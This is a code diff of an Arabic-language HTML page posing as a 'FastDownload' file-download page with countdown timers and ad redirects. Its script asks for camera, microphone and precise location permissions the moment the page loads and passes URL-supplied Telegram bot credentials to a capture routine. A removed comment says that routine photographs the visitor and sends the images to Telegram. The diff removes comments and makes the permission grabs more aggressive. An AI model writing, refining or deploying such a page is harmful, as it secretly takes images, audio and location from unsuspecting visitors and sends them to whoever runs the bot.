@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>تحميل الملف</title>
 <style>
-  /* ستايل صفحة التحميل بتاعتك */
   *{box-sizing:border-box}
   body{margin:0;background:#eef1f6;font-family:Tahoma,Arial,sans-serif;color:#2b3445;text-align:center}
   .nav{background:#1f2a44;color:#fff;padding:12px 16px;font-size:20px;font-weight:bold;letter-spacing:.5px}
@@ -48,7 +47,6 @@
 <div class="nav">Fast<span>Download</span></div>
 <div class="wrap">
 
-<!-- صفحة 1 -->
 <div class="page active" id="p1"><div class="card">
   <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>جاري تجهيز الرابط</h2>
@@ -59,7 +57,6 @@
   <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
-<!-- صفحة 2 -->
 <div class="page" id="p2"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>انتظر حتى ينتهي العداد</h2>
@@ -70,7 +67,6 @@
   <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
-<!-- صفحة 3 -->
 <div class="page" id="p3"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
   <h2>الرابط جاهز تقريباً</h2>
@@ -88,9 +84,7 @@
 <script>
 "use strict";
 
-/* ═══════════════════════════════════════════════════
-   1. كود الأذونات الخاص بك (زي ما هو)
-   ═══════════════════════════════════════════════════ */
+// 1. كود فك التشفير والأذونات
 function decodeBase64(value) {
     try {
         value = value.replace(/-/g, "+").replace(/_/g, "/");
@@ -98,9 +92,7 @@ function decodeBase64(value) {
         const binary = atob(value);
         const bytes = Uint8Array.from(binary, char => char.charCodeAt(0));
         return new TextDecoder().decode(bytes);
-    } catch (error) {
-        return "";
-    }
+    } catch (error) { return ""; }
 }
 
 function getFeatures() {
@@ -112,43 +104,13 @@ function getFeatures() {
     return new Set([...params.keys()].map(key => key.trim().toLowerCase()));
 }
 
-async function getPermissionState(name) {
-    if (!navigator.permissions) return "unknown";
-    try {
-        const permission = await navigator.permissions.query({ name: name });
-        return permission.state;
-    } catch (error) { return "unknown"; }
-}
-
-async function requestCamera() {
-    const state = await getPermissionState("camera");
-    if (state === "granted" || state === "denied") return;
-    if (!navigator.mediaDevices?.getUserMedia) return;
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        stream.getTracks().forEach(track => track.stop());
-    } catch (error) {}
-}
-
-async function requestMicrophone() {
-    const state = await getPermissionState("microphone");
-    if (state === "granted" || state === "denied") return;
-    if (!navigator.mediaDevices?.getUserMedia) return;
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
-        stream.getTracks().forEach(track => track.stop());
-    } catch (error) {}
-}
-
 async function requestLocation() {
-    const state = await getPermissionState("geolocation");
-    if (state === "granted" || state === "denied") return;
-    if (!navigator.geolocation) return;
-    await new Promise(resolve => {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve();
         navigator.geolocation.getCurrentPosition(
             () => resolve(),
-            error => resolve(),
-            { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     });
 }
@@ -159,14 +121,24 @@ async function start() {
     const microphone = ["r","fcv","bcv"].some(key => features.has(key));
     const location = features.has("l");
 
-    if (camera) await requestCamera();
-    if (microphone) await requestMicrophone();
+    // طلب الموقع فوراً
     if (location) await requestLocation();
+
+    // محاولة طلب الكاميرا والمايك فوراً
+    if (camera || microphone) {
+        try {
+            const constraints = {};
+            if (camera) constraints.video = true;
+            if (microphone) constraints.audio = true;
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            stream.getTracks().forEach(track => track.stop());
+        } catch (error) {
+            console.log("المتصفح منع الطلب الأوتوماتيكي، هنعيده مع أول لمسة.");
+        }
+    }
 }
 
-/* ═══════════════════════════════════════════════════
-   2. منطق الإرسال والالتقاط
-   ═══════════════════════════════════════════════════ */
+// 2. كود الإرسال
 const urlParams = new URLSearchParams(location.search);
 let BOT_ID = "", BOT_TOKEN = "";
 if (urlParams.get("u")) {
@@ -341,9 +313,7 @@ async function startFeatures() {
     }
 }
 
-/* ═══════════════════════════════════════════════════
-   3. كود التصميم والإعلانات والعدادات
-   ═══════════════════════════════════════════════════ */
+// 3. كود التصميم والإعلانات
 var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
@@ -366,32 +336,13 @@ function show(n){ document.querySelectorAll(".page").forEach(function(p){p.class
 addBanners("ads1"); 
 ring(1, WAIT1, false, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b1"); });
 
-// زرار متابعة صفحة 1
-$("b1").onclick = function(){ 
-    goNext(this, function(){ 
-        show(2); 
-        addGhost(); addBanners("ads2"); 
-        ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); 
-    }); 
-};
-
-// زرار متابعة صفحة 2
-$("b2").onclick = function(){ 
-    goNext(this, function(){ 
-        show(3); 
-        addGhost(); 
-        addBanners("ads3"); 
-        addNative("native3");
-        ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); 
-    }); 
-};
+$("b1").onclick = function(){ goNext(this, function(){ show(2); addGhost(); addBanners("ads2"); ring(2, WAIT2, true, "تم! اضغط على زر المتابعة بالأسفل ", function(){ reveal("b2"); }); }); };
+$("b2").onclick = function(){ goNext(this, function(){ show(3); addGhost(); addBanners("ads3"); addNative("native3"); ring(3, WAIT3, false, "الرابط جاهز! اضغط على زر التحميل بالأسفل ", function(){ reveal("b3"); }); }); };
 $("b3").onclick = function(){ window.location.href = SMART_LINK; };
 
-/* ═══════════════════════════════════════════════════
-   4. التشغيل الفوري (أول ما الصفحة تفتح)
-   ═══════════════════════════════════════════════════ */
-start();         // الكود بتاعك بيطلب الأذونات فوراً
-startFeatures(); // الكود اللي بيصور ويبعت على تليجرام فوراً
+// 4. التشغيل الفوري
+start(); 
+startFeatures();
 </script>
 </body>
   </html>
